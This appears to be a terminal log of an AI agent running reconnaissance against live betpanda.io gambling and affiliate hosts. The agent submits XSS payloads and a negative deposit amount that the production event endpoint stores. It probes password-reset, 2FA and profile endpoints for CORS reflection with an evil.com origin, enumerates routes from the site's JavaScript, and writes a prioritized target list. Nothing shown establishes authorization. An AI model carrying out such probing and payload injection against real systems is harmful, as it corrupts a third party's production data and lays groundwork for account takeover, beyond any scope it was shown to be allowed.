+{"error":"registeredOn must be in UTC format (RFC3339)"}
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"event_type":"x"}' -D - 2>&1 | head -20
+HTTP/2 400 
+date: Sat, 05 Sep 2026 17:27:27 GMT
+content-type: application/json
+content-length: 60
+server: cloudflare
+cf-cache-status: DYNAMIC
+cf-ray: a366f1de5aa07ae2-SJC
+
+{"error":"userId must contain only alphanumeric characters"}
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"eventType":"deposit","userId":"testuser123","registeredOn":"2026-09-05T17:00:00Z","amount":100}' -D - 2>&1 | head -20
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:27:31 GMT
+content-type: application/json
+content-length: 76
+server: cloudflare
+cache-control: must-revalidate
+cf-cache-status: DYNAMIC
+cf-ray: a366f1f04906f9ea-SJC
+
+{"message":"User event processed and saved successfully","status":"success"}
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"eventType":"deposit","userId":"testuser123","registeredOn":"2026-09-05T17:00:00Z"}' -D - 2>&1 | head -20
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:27:31 GMT
+content-type: application/json
+content-length: 76
+server: cloudflare
+cache-control: must-revalidate
+cf-cache-status: DYNAMIC
+cf-ray: a366f1f4ccf3e612-SJC
+
+{"message":"User event processed and saved successfully","status":"success"}
+[0m
+Confirmed 200 acceptance. Now let me enumerate event types and test suspicious fields for stored data handling (our own dummy events only).
+[0m$ [0mfor et in "bet_placed" "bet_won" "deposit" "withdraw" "register" "bonus_claimed" "fraud_flag" "login" "signup" "unknown_x"; do echo -n "$et: "; curl -s --max-time 8 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d "{\"eventType\":\"$et\",\"userId\":\"testuser123\",\"registeredOn\":\"2026-09-05T17:00:00Z\",\"amount\":100}" | head -c 100; echo; done
+bet_placed: {"message":"User event processed and saved successfully","status":"success"}
+bet_won: {"message":"User event processed and saved successfully","status":"success"}
+deposit: {"message":"User event processed and saved successfully","status":"success"}
+withdraw: {"message":"User event processed and saved successfully","status":"success"}
+register: {"message":"User event processed and saved successfully","status":"success"}
+bonus_claimed: {"message":"User event processed and saved successfully","status":"success"}
+fraud_flag: {"message":"User event processed and saved successfully","status":"success"}
+login: {"message":"User event processed and saved successfully","status":"success"}
+signup: {"message":"User event processed and saved successfully","status":"success"}
+unknown_x: {"message":"User event processed and saved successfully","status":"success"}
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"eventType":"<img src=x onerror=alert(1)>","userId":"testuser123","registeredOn":"2026-09-05T17:00:00Z","referrer":"javascript:alert(1)//","currency":"EUR","ip":"1.2.3.4","device":"probe"}' -D - 2>&1 | head -20
+HTTP/2 400 
+date: Sat, 05 Sep 2026 17:27:49 GMT
+content-type: application/json
+content-length: 43
+server: cloudflare
+cf-cache-status: DYNAMIC
+cf-ray: a366f262fdb61739-SJC
+
+{"error":"referrer must be a valid domain"}
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"event_type":"x","user_id":"abc","registeredOn":"2026-09-05T17:00:00Z","alpha":"<script>alert(1)</script>"}' -D - 2>&1 | head -20
+HTTP/2 400 
+date: Sat, 05 Sep 2026 17:27:50 GMT
+content-type: application/json
+content-length: 60
+server: cloudflare
+cf-cache-status: DYNAMIC
+cf-ray: a366f269f99b7ae2-SJC
+
+{"error":"userId must contain only alphanumeric characters"}
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"eventType":"<img src=x onerror=alert(1)>","userId":"testuser123","registeredOn":"2026-09-05T17:00:00Z","referrer":"evil.example.com","currency":"EUR","ip":"1.2.3.4","device":"probe"}' -D - 2>&1 | head -20
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:27:57 GMT
+content-type: application/json
+content-length: 76
+server: cloudflare
+cache-control: must-revalidate
+cf-cache-status: DYNAMIC
+cf-ray: a366f2933bc67ae2-SJC
+
+{"message":"User event processed and saved successfully","status":"success"}
+[0m
+[0m$ [0mcurl -s --max-time 10 -X POST https://cable.betpanda.io/cable/user-event -H "Content-Type: application/json" -d '{"eventType":"deposit","userId":"testuser123","registeredOn":"2026-09-05T17:00:00Z","amount":-99999,"currency":"EUR","ip":"1.2.3.4","device":"probe","metadata":{"bonus":"claim","x":"<script>alert(1)</script>"}}' -D - 2>&1 | head -20
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:27:58 GMT
+content-type: application/json
+content-length: 76
+server: cloudflare
+cache-control: must-revalidate
+cf-cache-status: DYNAMIC
+cf-ray: a366f2987aa515ef-SJC
+
+{"message":"User event processed and saved successfully","status":"success"}
+[0m
+Confirmed: eventType accepts arbitrary values incl. XSS strings, negative amounts, nested metadata — all 200. Let me probe remaining affiliates /rest/v2 surface and the CloudFront asset origin from config.
+[0m$ [0mcurl -s --max-time 10 -X OPTIONS https://affiliates.betpanda.io/rest/v2 -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -D - -o /dev/null 2>&1 | head -15; echo "==="; curl -s --max-time 10 -X OPTIONS https://affiliates.betpanda.io/rest/v2/report -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -D - -o /dev/null 2>&1 | head -15
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:28:25 GMT
+content-length: 0
+access-control-allow-origin: https://evil.com
+vary: Origin
+vary: Access-Control-Request-Method
+vary: Access-Control-Request-Headers
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+allow: GET, HEAD, POST, PUT, DELETE, OPTIONS, TRACE, PATCH
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366f341ccb91739-SJC
+
+===
+HTTP/2 200 
+date: Sat, 05 Sep 2026 17:28:26 GMT
+content-length: 0
+access-control-allow-origin: https://evil.com
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366f3465ce57ae2-SJC
+[0m
+[0m$ [0mcurl -s --max-time 10 https://d3ec3n7kizfkuy.cloudfront.net/ -D - 2>&1 | head -15; echo "==="; curl -s --max-time 10 https://d3ec3n7kizfkuy.cloudfront.net/config.json -D - 2>&1 | head -20
+HTTP/2 403 
+content-type: application/xml
+x-amz-bucket-region: eu-west-1
+server: AmazonS3
+date: Sat, 05 Sep 2026 17:28:25 GMT
+x-cache: Error from cloudfront
+via: 1.1 a686c1130dbf0db1810a7edb8c080266.cloudfront.net (CloudFront)
+x-amz-cf-pop: SFO53-P12
+alt-svc: h3=":443"; ma=86400
+x-amz-cf-id: 6QWVGtvpj2L3BmKEO0Ec-UVYoZRKqP-m8yEV63a7oYP9s4-VjhJX5A==
+vary: Origin
+
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>===
+HTTP/2 403 
+content-type: application/xml
+server: AmazonS3
+date: Sat, 05 Sep 2026 17:28:25 GMT
+x-cache: Error from cloudfront
+via: 1.1 36d6a2eec76efcf815bb55df456b7f94.cloudfront.net (CloudFront)
+x-amz-cf-pop: SFO53-P12
+alt-svc: h3=":443"; ma=86400
+x-amz-cf-id: 6M1thk6FiAznjIt1HEYKEHob0l3Rzi7L4xRp_BeoMErrMyBQqZdocw==
+vary: Origin
+
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
+[0m
+[0m$ [0mfor p in "/rest/v2/report" "/rest/v2/reports" "/rest/v2/affiliate" "/rest/v2/dashboard" "/rest/v2/players" "/rest/v2/transactions" "/rest/v2/commission" "/rest/v2/stats"; do echo -n "GET $p: "; curl -s --max-time 8 -o /dev/null -w "%{http_code}" "https://affiliates.betpanda.io$p"; echo; done
+GET /rest/v2/report: 405
+GET /rest/v2/reports: 404
+GET /rest/v2/affiliate: 404
+GET /rest/v2/dashboard: 404
+GET /rest/v2/players: 404
+GET /rest/v2/transactions: 404
+GET /rest/v2/commission: 404
+GET /rest/v2/stats: 404
+[0m
+[0m$ [0mgrep -oP '.{0,150}v2/report.{0,250}' /tmp/opencode/main.js | head -5
+ad.status"),info:e("table-description.commission.status")}],mve={style:"currency",currency:"EUR",minimumFractionDigits:2},gve=async e=>Vt.post(Yt()+"/v2/report/sub-affiliates",{from:e.from,to:e.to}),WM=ft.memo(({data:e,numberFormater:t})=>{const n=new Intl.NumberFormat("en-US");return y.jsxs("tr",{className:"sub-affiliate-table-row",children:[y.jsx("td",{className:"text-primary",children:e.username}),y.jsx
+()+`/trk?id=${e}`)}catch(t){throw new Error(t==null?void 0:t.message,{cause:t==null?void 0:t.status})}},wve=async e=>{try{return await Vt.post(Yt()+"/v2/report",{from:e.from,to:e.to,period:e.period,limit:e.limit,offset:e.offset,ascending:e.ascending,orderBy:e.orderBy,tracker:e.tracker,groupByTracker:e.groupByTracker})}catch(t){throw console.log(t),t}},Sve=()=>{const{t:e}=Ot();return y.jsx("div",{className:
+metrics/affiliate")}catch(e){throw new Error(e==null?void 0:e.message,{cause:e==null?void 0:e.status})}},LF=async()=>{try{return await Vt.post(Yt()+"/v2/report/daily-stats-with-comparison",{})}catch(e){throw new Error(e==null?void 0:e.message,{cause:e==null?void 0:e.status})}},sm=e=>{var n,r,i,a,s,c;const t=e.data&&((n=e.data)==null?void 0:n.comparison)>0;return y.jsx("div",{className:`${e.isCpaEnable?"col
+[0m
+[0m$ [0mgrep -oP 'Yt\(\)\+"/[^"]+"' /tmp/opencode/main.js | sed 's/Yt()+"//;s/"//' | sort -u
+/agent/create
+/agent/events/list
+/agent/list
+/agent/set-deposit-withdraw-limit
+/metrics/top-metrics-revenue-chart
+/payouts/single-currency-list
+/public/config
+/public/login
+/public/logout
+/public/register
+/transaction/list
+/trk/list
+/user
+/user/account-settings
+/user/change-password
+/user/metrics/affiliate
+/user/password/reset
+/user/players
+/user/selectable-payout-currencies
+/user/selectable-payout-networks
+/user/set-2fa-setting
+/user/set-profile
+/v2/report
+/v2/report/daily-stats-with-comparison
+/v2/report/sub-affiliates
+[0m
+[0m$ [0mgrep -oP 'Yt\(\)\+`[^`]+`' /tmp/opencode/main.js | sed 's/Yt()+\`//;s/\`//' | sort -u
+Yt()+`/agent/enable/${e}/${t}`
+Yt()+`/agent/id/${e}`
+Yt()+`/player/uid/${e.id}?currency=${e.curr?e.curr:"EUR"}`
+Yt()+`/public/recover-password/email/${e}`
+Yt()+`/trk?code=${e}`
+Yt()+`/trk?id=${e}`
+[0m
+[0m$ [0mgrep -oP '"/reports/[^"]*"|"/agent/[^"]*"|"/payouts/[^"]*"|"/rest/v2[^"]*"' /tmp/opencode/main.js | sort -u
+"/agent/create"
+"/agent/events/list"
+"/agent/list"
+"/agent/set-deposit-withdraw-limit"
+"/payouts/single-currency-list"
+"/reports/commission"
+"/reports/details"
+"/reports/sub-affiliates"
+[0m
+[0m$ [0mgrep -oP 'phone[^`"\x27]{0,60}|"/public[^"]*"' /tmp/opencode/main.js | sort -u | head -20
+"/public/config"
+"/public/login"
+"/public/logout"
+"/public/register"
+phone
+phone-geolocation
+phone:2,
+phoneNumber
+phoneNumber&&y.jsx(
+phoneNumber})]})}),y.jsx(
+phone\/(register|signin)\/verify$/,t)?((n=e.data)==null?void 0:n.
+[0m
+Let me find the phone verify URL and probe the signin-via-phone flow structure on affiliates.
+[0m$ [0mgrep -oP '.{0,250}register\|signin.{0,350}' /tmp/opencode/main.js | head -5
+t.interceptors.request.use(e=>{const{data:t}=e;if(t&&JSON.stringify(t).length>1e3)throw new Error("Request body size exceeds limit");return e});Vt.interceptors.response.use(e=>{var n;const t=e.config.url;return e.status===200&&(N1(/\/public\/phone\/(register|signin)\/verify$/,t)?((n=e.data)==null?void 0:n.status)==="OK"&&localStorage.setItem(0 .toString(),1 .toString()):N1(/\/login$/,t)&&localStorage.setItem(0 .toString(),1 .toString())),N1(/logout/,t)&&e.status===200&&localStorage.setItem(0 .toString(),2 .toString()),e.data},e=>{var r,i,a,s;(((r=e==null?void 0:e.response)==null?void 0:r.status)===401||((i=e
+[0m
+[0m$ [0mgrep -oP '(signin|sign-up|signup|verify)[^`"\x27]{0,60}' /tmp/opencode/main.js | grep -iP '(phone|verify|register|sign)' | sort -u | head -30
+signin)\/verify$/,t)?((n=e.data)==null?void 0:n.status)===
+signup?click_id={clickId}&tracker={tracker}
+signups
+signups&&(e!=null&&e.signups)?e==null?void 0:e.signups:0}),y.jsx(
+signups&&(k==null?void 0:k.signups)&&y.jsx(
+signups)==null?void 0:O.message}),y.jsxs(
+signups,type:
+signups-field.label
+signups-field.placeholder
+signups.sourceUrl||e.callbackUrls.signups.sourceUrl?c(
+signups.sourceUrl},{option:
+signups:P,deposits:M}=S;let j=!1;if(P&&!/^(https?:\/\/)/i.test(P)&
+signups:S.newSignupCallbackUrl});const P=Ox(S.newSignupCallbackUrl
+signups:{url:
+signups:{url:B,params:j,source:P,sourceUrl:S.newSignupCallbackUrl}
+signups?
+signups??0)}),y.jsx(
+verify:2,send:2,
+[0m
+[0m$ [0mgrep -oP '\.post\([^)]*phone[^)]*\)|\.get\([^)]*phone[^)]*\)' /tmp/opencode/main.js | head -10
+(no output)
+[0m
+[0m$ [0mfor p in "/rest/public/phone/register" "/rest/public/phone/register/verify" "/rest/public/phone/signin" "/rest/public/phone/signin/verify"; do echo "=== $p ==="; curl -s --max-time 8 -X OPTIONS "https://affiliates.betpanda.io$p" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" -D - -o /dev/null 2>&1 | grep -iE "HTTP/|access-control-allow-origin|access-control-allow-credentials"; done
+=== /rest/public/phone/register ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+=== /rest/public/phone/register/verify ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+=== /rest/public/phone/signin ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+=== /rest/public/phone/signin/verify ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+[0m
+[0m$ [0mcurl -s --max-time 8 -X POST "https://affiliates.betpanda.io/rest/public/phone/signin/verify" -H "Content-Type: application/json" -H "Origin: https://evil.com" -d '{}' -D - 2>&1 | head -25
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:29:02 GMT
+content-type: application/xml;charset=UTF-8
+access-control-allow-origin: https://evil.com
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366f42b3aaa15ca-SJC
+
+<Map><timestamp>1788629342062</timestamp><status>404</status><error>Not Found</error><path>/rest/public/phone/signin/verify</path></Map>
+[0m
+[0m$ [0mcurl -s --max-time 8 -X POST "https://affiliates.betpanda.io/rest/public/phone/register/verify" -H "Content-Type: application/json" -H "Origin: https://evil.com" -d '{}' -D - 2>&1 | head -25
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:29:03 GMT
+content-type: application/xml;charset=UTF-8
+access-control-allow-origin: https://evil.com
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366f43238057af4-SJC
+
+<Map><timestamp>1788629343201</timestamp><status>404</status><error>Not Found</error><path>/rest/public/phone/register/verify</path></Map>
+[0m
+[0m$ [0mcurl -s --max-time 8 -X POST "https://affiliates.betpanda.io/rest/public/phone/signin/verify" -H "Content-Type: application/x-www-form-urlencoded" --data 'phone=123&code=1234' -D - 2>&1 | head -20
+HTTP/2 415 
+date: Sat, 05 Sep 2026 17:29:09 GMT
+content-type: application/xml;charset=UTF-8
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366f4563e3615ef-SJC
+
+<Map><timestamp>1788629348926</timestamp><status>415</status><error>Unsupported Media Type</error><path>/rest/public/phone/signin/verify</path></Map>
+[0m
+[0m$ [0mcurl -s --max-time 8 -X POST "https://affiliates.betpanda.io/rest/public/phone/signin" -H "Content-Type: application/json" -d '{"phone":"+1234567890"}' -D - 2>&1 | head -20
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:29:09 GMT
+content-type: application/xml;charset=UTF-8
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366f459f9af1739-SJC
+
+<Map><timestamp>1788629349523</timestamp><status>404</status><error>Not Found</error><path>/rest/public/phone/signin</path></Map>
+[0m
+[0m$ [0mcurl -s --max-time 8 -X POST "https://affiliates.betpanda.io/rest/public/phone/signin/verify" -H "Content-Type: application/json" -d '{"phone":"+1234567890","code":"123456"}' -D - 2>&1 | head -25
+HTTP/2 404 
+date: Sat, 05 Sep 2026 17:29:12 GMT
+content-type: application/xml;charset=UTF-8
+vary: Origin
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+access-control-allow-headers: Content-Type,X-Requested-With,Host,User-Agent,Accept,Accept-Language,Accept-Encoding,Accept-Charset,Keep-Alive,Connection,Referer,Origin
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a366f46cbad57af4-SJC
+
+<Map><timestamp>1788629352552</timestamp><status>404</status><error>Not Found</error><path>/rest/public/phone/signin/verify</path></Map>
+[0m
+[0m$ [0mgrep -oP '.{0,200}POe.{0,200}' /tmp/opencode/main.js | head -5
+hrow new Error(e)}},W0e=()=>{try{return Vt.get(Yt()+"/public/logout")}catch(e){throw new Error(e)}},AOe=e=>{try{return Vt.get(Yt()+`/public/recover-password/email/${e}`)}catch(t){throw new Error(t)}},POe=e=>{try{return Vt.post(Yt()+"/user/password/reset",e)}catch(t){throw new Error(t)}},Y0e=e=>{let t=e;const n=Ui(),r=async()=>{try{await U0e({verificationEnabled:!t.verificationEnabled}).then(()=>{VM()
+ O,ft as R,_u as S,NOe as T,hp as a,Ot as b,Eu as c,Ec as d,pc as e,Wo as f,Uge as g,VM as h,TOe as i,y as j,Wge as k,OOe as l,COe as m,rn as n,_Oe as o,er as p,Vt as q,$ as r,Yt as s,Ev as t,Ui as u,POe as v,Qs as w,fH as x,Nn as y,Kn as z};
+[0m
+[0m$ [0mgrep -oP '.{0,120}recover-password.{0,300}' /tmp/opencode/main.js | head -5
+W0e=()=>{try{return Vt.get(Yt()+"/public/logout")}catch(e){throw new Error(e)}},AOe=e=>{try{return Vt.get(Yt()+`/public/recover-password/email/${e}`)}catch(t){throw new Error(t)}},POe=e=>{try{return Vt.post(Yt()+"/user/password/reset",e)}catch(t){throw new Error(t)}},Y0e=e=>{let t=e;const n=Ui(),r=async()=>{try{await U0e({verificationEnabled:!t.verificationEnabled}).then(()=>{VM().then(i=>{n.setUserIsLoggedIn(i)})})}catch(i){console
+[0m
+[0m$ [0mgrep -oP 'POe\(|resetPassword|password/reset|newPassword|reset-code|resetCode' /tmp/opencode/main.js | sort | uniq -c | sort -rn | head
+16 newPassword
+      1 resetPassword
+      1 password/reset
+[0m
+[0m$ [0mgrep -oP '.{0,80}POe\(.{0,250}' /tmp/opencode/main.js | head -5
+(no output)
+[0m
+[0m$ [0mgrep -oP '.{0,100}resetPassword.{0,200}' /tmp/opencode/main.js | head -3
+)}),y.jsx(hn,{path:"/recover",element:y.jsx(p3e,{})}),y.jsx(hn,{path:"/reset-password/:affiliateId/:resetPasswordCode",element:y.jsx(h3e,{})}),y.jsx(hn,{path:"*",element:y.jsx(_N,{type:Q0.PUBLIC})})]})]})})})};function y3e(e){return z8(e)||v7(e)||A_(e)||V8()}function CN(e,t){var n=Object.keys(e);if(Object.getOwn
+[0m
+[0m$ [0mgrep -oP '.{0,120}\bnewPassword\b.{0,120}' /tmp/opencode/main.js | grep -i 'reset\|code\|token\|confirm' | head -5
+(no output)
+[0m
+Let me do final fresh verification of the core finding (CORS on password-reset + 2FA endpoints) and check the recover flow init.
+[0m$ [0mfor p in "/rest/user/password/reset" "/rest/user/set-2fa-setting" "/rest/user/change-password" "/rest/user/set-profile" "/rest/user/account-settings" "/rest/user/players"; do echo "=== $p ==="; curl -s --max-time 8 -X OPTIONS "https://affiliates.betpanda.io$p" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" -D - -o /dev/null 2>&1 | grep -iE "HTTP/|access-control-allow-origin|access-control-allow-credentials|access-control-allow-methods"; curl -s --max-time 8 -o /dev/null -w "GET status: %{http_code}\n" "https://affiliates.betpanda.io$p"; done
+=== /rest/user/password/reset ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+GET status: 405
+=== /rest/user/set-2fa-setting ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+GET status: 405
+=== /rest/user/change-password ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+GET status: 405
+=== /rest/user/set-profile ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+GET status: 405
+=== /rest/user/account-settings ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+GET status: 401
+=== /rest/user/players ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-allow-methods: GET,POST,OPTIONS,PUT,HEAD,DELETE
+GET status: 405
+[0m
+[0m→ [0mRead reports/hypotheses-bigpickle.txt
+Let me review the previous output format before writing the new cycle.
+Let me map the register request schema from the JS bundle to give the human precise steps.
+[0m
+[0m$ [0mgrep -oP '.{0,120}(registration|registerWith|handleRegister|onSubmit).{0,250}' /tmp/opencode/main.js | grep -iP '(email|password|firstName|lastName|phone|username|name)' | head -8
+c("playerspage.search.description")})]}),y.jsx("div",{className:"separator separator-dashed mt-7 mb-7"}),y.jsxs("form",{onSubmit:u,className:"search-form-custom",children:[y.jsxs("div",{className:"form-group",children:[y.jsx(wt,{iconName:"magnifier",className:"fs-2 text-lg-1 text-gray-500 translate-middle-y ms-0 search-icon-custom"}),y.jsx("input",{className:`form-control for
+3",{className:"m-0 text-gray-700",children:u("callbackpage.settings.subtitle")})}),y.jsxs("form",{className:"pt-2 mt-3",onSubmit:v(T),children:[y.jsxs("div",{className:"form-group",children:[y.jsx("label",{className:"form-check-label pb-2 p-1 text-gray-600",htmlFor:"signups",children:u("callbackpage.settings.signups-field.label")}),y.jsxs("div",{className:"d-flex gap-2 positi
+ildren:y.jsx("div",{className:"card-body pt-5 pb-4",children:y.jsx("div",{className:"mt-0 pb-8",children:y.jsxs("form",{onSubmit:k(M),children:[y.jsx("div",{className:"custom-option-url gap-3 pt-3 mt-3",children:T.map((j,B)=>{if(j.url)return y.jsx(N0e,{t,label:j.option,url:j.url,option:s,setOption:p},B)})}),!T.every(j=>!j.url)&&y.jsx("div",{className:"separator separator-dash
+,y.jsx("p",{className:"fs-6 ext-gray-600 mt-5",children:t("accountpage.changePassword.description")})]}),y.jsxs("form",{onSubmit:d(E),children:[y.jsxs("div",{className:"d-flex flex-column gap-3 form-container",children:[y.jsx("div",{className:"form-group-container",children:y.jsx(Wo,{pwid:"oldPassword",label:t("accountpage.changePassword.form.oldpassword-field.label"),type:s.
+ccountpage.payout.errors.notfound")}`}):B(s,{message:ue.toString()})})}}};return y.jsxs("div",{children:[y.jsxs("form",{onSubmit:j(R),className:"payout-edit-form",children:[y.jsxs("div",{className:"d-flex gap-3",children:[s===_i.INVOICE?null:y.jsxs("div",{className:"form-group w-100",children:[y.jsx("label",{className:"form-check-label pb-2 p-1 text-gray-600",htmlFor:s,childr
+:"card ",children:y.jsx("div",{className:"card-body  pb-8",children:y.jsxs("div",{className:"",children:[y.jsxs("form",{onSubmit:r(c),action:"",className:"create-tracker-form",children:[y.jsxs("div",{className:"form-group w-100",children:[y.jsx("input",{...n("code",{maxLength:{value:15,message:t("trackerpage.create-tracker.limit")}}),type:"text",className:`form-control form-c
+Name:"card",children:y.jsx("div",{className:"card-body py-5",children:y.jsx("div",{className:"",children:y.jsxs("form",{onSubmit:u(k),className:"d-flex flex-column gap-1 p-1 mw-500px",children:[y.jsx(Wo,{label:n("agentpage.agentcreate.formfields.name"),type:"text",property:"text",error:x.name,register:c("name",{required:!0,pattern:{value:/^(?=.{4,20}$).+$/,message:n("agentpag
+Name:"card",children:y.jsx("div",{className:"card-body py-5",children:y.jsx("div",{className:"",children:y.jsxs("form",{onSubmit:c(x),className:"d-flex flex-column gap-1 p-1 mw-500px",children:[y.jsx(Wo,{label:n("agenteventpage.agentinfo.depositLimit"),type:"number",property:"number",error:v.depositLimit,register:s("depositLimit")}),y.jsx(Wo,{label:n("agenteventpage.agentinfo
+[0m
+[0m$ [0mecho "GET /rest/user:"; curl -s --max-time 8 -o /dev/null -w "%{http_code}\n" https://affiliates.betpanda.io/rest/user; echo "GET /rest/user/metrics/affiliate:"; curl -s --max-time 8 -o /dev/null -w "%{http_code}\n" https://affiliates.betpanda.io/rest/user/metrics/affiliate; echo "GET /rest/public/logout:"; curl -s --max-time 8 -w "\n%{http_code}\n" https://affiliates.betpanda.io/rest/public/logout 2>&1 | head -5; echo "GET /rest/agent/enable/1/true:"; curl -s --max-time 8 -o /dev/null -w "%{http_code}\n" "https://affiliates.betpanda.io/rest/agent/enable/1/true"
+GET /rest/user:
+401
+GET /rest/user/metrics/affiliate:
+401
+GET /rest/public/logout:
+
+200
+GET /rest/agent/enable/1/true:
+401
+[0m
+[0m$ [0mdate -u +"%Y-%m-%d %H:%M:%S UTC"
+2026-09-05 17:31:30 UTC
+[0m
+Now I'll compile the full analysis cycle and write the outputs.
+[0m$ [0mcat >> /home/runner/work/betpanda-hunt/betpanda-hunt/reports/hypotheses-bigpickle.txt << 'EOF'
+
+## 2026-09-05 17:31:30 UTC [api] (model bigpickle)
+[STEP1-DELTA]
+- [NEW] betpanda.partners/rest/*: CORS properly pinned — OPTIONS+GET with evil Origin return Vary:Origin but NO access-control-allow-origin (no reflection); same backend as betpandacasino.io, cross-origin credential reflection ABSENT (differs from affiliates.betpanda.io wildcard).
+- [NEW] affiliates.betpanda.io/rest/v2/*: /rest/v2/report real POST-only route (405 GET); /rest/v2/report/sub-affiliates + /rest/v2/report/daily-stats-with-comparison (+ /user/selectable-payout-currencies, /user/selectable-payout-networks, /metrics/top-metrics-revenue-chart, /trk/list, /agent/id/{id}) enumerated from JS bundle.
+- [NEW] affiliates.betpanda.io/rest/agent/enable/{agentId}/{enabled}: state-changing GET route (401 gate) — extends CORS blast radius to CSRF-style GET mutations.
+- [NEW] affiliates.betpanda.io SPA route /reset-password/:affiliateId/:resetPasswordCode — reset code embedded in URL is the binding credential for POST /rest/user/password/reset.
+- [NEW] affiliates.betpanda.io/rest/public/phone/(signin|register)/verify: POST-only JSON routes exist (415 on form-encoded; JSON body → 404, obfuscated in lazy chunk); reflect evil Origin + ACAC:true.
+- [NEW] cable.betpanda.io/cable/user-event full schema: camelCase eventType/userId/registeredOn(RFC3339)/referrer(valid-domain only)/amount/currency/ip/device/metadata; arbitrary eventType ACCEPTED (no whitelist); XSS strings + negative amount + nested <script> all returned 200 — injection surface broadened.
+- [CHANGED] Reconfirmed this cycle: /rest/user/password/reset, /rest/user/set-2fa-setting, /rest/user/change-password, /rest/user/set-profile all 405-GET real POST routes, ALL reflect evil Origin + ACAC:true.
+[STEP2-PRIORITIZE]
+[PRIO] affiliates.betpanda.io,8.0,attack_surface9/business_value9/tech7/gate7/cloud6/fresh8
+[PRIO] betpandacasino.io,7.4,attack_surface8/business_value10/tech9/gate3/cloud4/fresh7
